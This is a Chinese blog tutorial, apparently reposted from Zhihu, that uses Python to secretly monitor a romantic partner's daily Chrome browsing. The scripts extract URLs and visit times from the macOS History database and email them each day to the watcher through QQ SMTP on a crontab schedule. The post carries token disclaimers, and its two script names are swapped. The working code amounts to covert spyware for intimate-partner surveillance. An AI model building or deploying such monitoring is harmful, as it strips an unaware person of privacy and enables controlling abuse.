# Python监控你的女朋友/男朋友每天都在看哪些网站 - zhusongziye的博客 - CSDN博客





2018年11月26日 19:29:23[zhusongziye](https://me.csdn.net/zhusongziye)阅读数：214








## 需求：

(1) 获取你对象chrome前一天的浏览记录中的所有网址(url)和访问时间，并存在一个txt文件中

(2)将这个txt文件发送给指定的邮箱地址(你的邮箱)

(3)建立例行任务，每天定时自动完成这些操作，你就可以通过邮件查看你对象每天看啥了

## 背景：

(1)mac下chrome的浏览记录在哪？怎么获取网址(url)和访问时间？

答：路径：/Users/用户名/Library/Application\ Support/Google/Chrome/Default/History

History：是一个SQLite数据库，其实就是一个文件，可以用DB Browser for SQLite

去查看所有的信息，我们要的信息在urls表中

怎么获取：用python内置的sqlite3库连接History，通过sql得到我们想要的信息

(2)怎么发送一个带附件的邮件？

答：使用python内置的email和smtplib两个模块去构造和发送邮件

(3)怎么把这些过程自动化?

答：使用shell脚本将这些过程连接起来，然后使用crontab命令定时运行

**准备**

macOS Sierra

Python3.6

Chrome

发送邮件的qq邮箱地址

qq邮箱授权码

SMTP服务器地址 : smtp.qq.com

接受邮件的邮箱地址

## 执行：

(1) 首先我们用DB Browser for SQLite来看下History中的urls表的数据组成

从表中可以看出，我们要的网址和访问时间就在urls.url和urls.last_visit_time中

![](https://img-blog.csdnimg.cn/20181124161056490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3podXNvbmd6aXll,size_16,color_FFFFFF,t_70)

(2) get_history.py：

```
# -*- coding: utf-8 -*-
from email import encoders
from email.header import Header
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.utils import parseaddr, formataddr
import smtplib
import argparse

# 1.文件执行的需要的参数(result.txt)
parser = argparse.ArgumentParser()
parser.add_argument('affix_file',help='the path of the affix')
args = parser.parse_args()


# 2.格式化一个邮件地址和邮件信息
def _format_addr(s):
    name, addr = parseaddr(s)
    return formataddr((Header(name, 'utf-8').encode(), addr))

#连接服务器(这里大家好改成自己的！)
from_addr = "771568102@qq.com" #发件人邮箱
password = "xxxxxxxx" #发件人邮箱授权码
to_addr = "2160802033@cnu.edu.cn" #收件人邮箱
smtp_server = "smtp.qq.com" #SMTP服务器地址

#邮件发件人名字、收件人名字、主题
msg = MIMEMultipart()
msg['From'] = _format_addr('风一样的女子 <%s>' % from_addr)
msg['To'] = _format_addr('风一样的男子 <%s>' % to_addr)
msg['Subject'] = Header('chrome历史记录每日更新', 'utf-8').encode()

# 邮件正文是MIMEText:
msg.attach(MIMEText('窥探隐私是犯法的啊！', 'plain', 'utf-8'))

# 添加附件就是加上一个MIMEBase，从本地读取一个txt文件:
with open(args.affix_file, 'r') as f:
    # 设置附件的MIME和文件名，这里是py类型:
    mime = MIMEBase('result', 'txt', filename='result.txt')
    # 加上必要的头信息:
    mime.add_header('Content-Disposition', 'attachment', filename='result.txt')
    mime.add_header('Content-ID', '<0>')
    mime.add_header('X-Attachment-Id', '0')
    # 把附件的内容读进来:
    mime.set_payload(f.read())
    # 用Base64编码:
    encoders.encode_base64(mime)
    # 添加到MIMEMultipart:
    msg.attach(mime)

#3.通过SMTP发送出去
server = smtplib.SMTP(smtp_server, 25)
server.set_debuglevel(1)
server.login(from_addr, password)
server.sendmail(from_addr, [to_addr], msg.as_string())
server.quit()
```

通过这个脚本，我们可以把url和访问时间提取出来，并且存储在

result.txt中，下图就是我得到的部分结果

![](https://img-blog.csdnimg.cn/20181124161112628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3podXNvbmd6aXll,size_16,color_FFFFFF,t_70)

(3) send_email.py：

```
# -*- coding: utf-8 -*-
import sqlite3

#大家要改成自己的路径
history_db = '/Users/Marcel/Desktop/tmp/code/chrome_history/History'

# 1.连接history_db
c = sqlite3.connect(history_db)
cursor = c.cursor()


# 2.选取我们想要的网址和访问时间
try:
    select_statement = "SELECT url,datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime') AS tm FROM urls WHERE julianday('now') - julianday(tm) < 1 ORDER BY tm;"
    cursor.execute(select_statement)
except sqlite3.OperationalError:
    print("[!] The database is locked! Please exit Chrome and run the script again.")
    quit()

# 3.将网址和访问时间存入result.txt文件
results = cursor.fetchall()
with open('/Users/Marcel/Desktop/tmp/code/chrome_history/result.txt','w') as f:#改成自己的路径
    for i in range(len(results)):
        f.write(results[i][1]+'\n')
        f.write(results[i][0]+'\n')
```

通过这个脚本，我们可以把result.txt作为附件，发送给指定邮箱地

址，下图是我得到的部分结果

![](https://img-blog.csdnimg.cn/20181124161125317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3podXNvbmd6aXll,size_16,color_FFFFFF,t_70)

(4) ./start.sh ：其实，前面几个脚本，已经完成了我们的任务，但是每次都执行这么多脚

本，太麻烦了，我们可以把这些脚本的执行语句整理成一个shell脚本。

```
cp /Users/Marcel/Library/Application\ Support/Google/Chrome/Default/History /Users/Marcel/Desktop/tmp/code/chrome_history/
python /Users/Marcel/Desktop/tmp/code/chrome_history/get_history.py
python /Users/Marcel/Desktop/tmp/code/chrome_history/send_mail.py /Users/Marcel/Desktop/tmp/code/chrome_history/result.txt
```

这样，我们在终端执行./start.sh，系统就会帮我们把这三条语句依次执行了

注意：由于crontab命令需要绝对路径，所以这里的路径都是用绝对路径

(5) crontab ：如果使用了这个命令，在电脑开机并且联网的情况，系统会自动执行，然后把结果发到你的邮箱

使用方法：在终端下输入crontab -e，使用vim输入下面一行代码就可以了
`20 14 * * * /Users/Marcel/Desktop/tmp/code/chrome_history/start.sh`
说明：前面两个数字，就是你每天执行这个脚本的时间，我这里设置的是14：20。

重要的事再说一遍，一定要写绝对路径！！！

## 问题：

1.server.login(from_addr, password)函数中的password不是邮箱密码，在qq邮箱中，指的是授权码

答：qq邮箱授权码：什么是授权码，它又是如何设置？_QQ邮箱帮助中心

2.访问History数据库时，显示The database is locked!

答：在我们打开浏览器的同时去访问History时，就会出现这种情况，有两种解决办法：

(1)关闭浏览器，再去访问

(2)把History拷贝到其他文件夹中，然后访问该文件夹下的History

3.timestamp时间戳怎么转换的

答：last_visit_time是微秒，所以要除以10^6；

last_visit_time的起始值是1601年1月1日0时0分0秒，所以要减去11644473600；

筛选昨天的数据：现在的日期与last_visit_time的差值小于1的数据，就是距离当前时

间小于1天的数据

4.crontab出错

答：crontab中所有路径都要写绝对路径，包括py脚本中的路径也要写绝对路径！

5.路劲问题

答：大家在复现的时候，要注意把路劲改成自己电脑上的，还有那个邮箱相关的信息也要改成自己的。

## 总结：

1.运用python连接SQLite数据库，并执行sql操作

2.运用python发送邮件

3.运用shell和crontab建立自动化例行任务

4.看别人隐私是不对的，这篇文章只是我自己瞎玩的，实际可行性不强

## 展望：

1.把这些打包成一个可执行文件，双击之后可以直接部署，并且可以跨平台

2.目前这个脚本，只有在电脑是打开并且联网的时候，才能自动执行，所以并不能理想地监控别人的浏览记录哦！



作者：marcelyz

源自：https://zhuanlan.zhihu.com/p/39426683



